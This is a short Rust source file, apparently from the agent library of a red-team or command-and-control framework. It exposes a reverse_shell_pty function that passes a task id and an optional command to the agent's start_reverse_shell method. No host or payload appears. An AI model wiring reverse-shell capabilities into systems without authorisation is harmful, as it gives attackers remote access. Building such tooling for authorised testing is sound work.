use anyhow::Result;
use alloc::string::String;
use alloc::sync::Arc;
use eldritch_libagent::agent::Agent;

pub fn reverse_shell_pty(agent: Arc<dyn Agent>, task_id: i64, cmd: Option<String>) -> Result<()> {
    agent.start_reverse_shell(task_id, cmd).map_err(|e| anyhow::anyhow!(e))
}
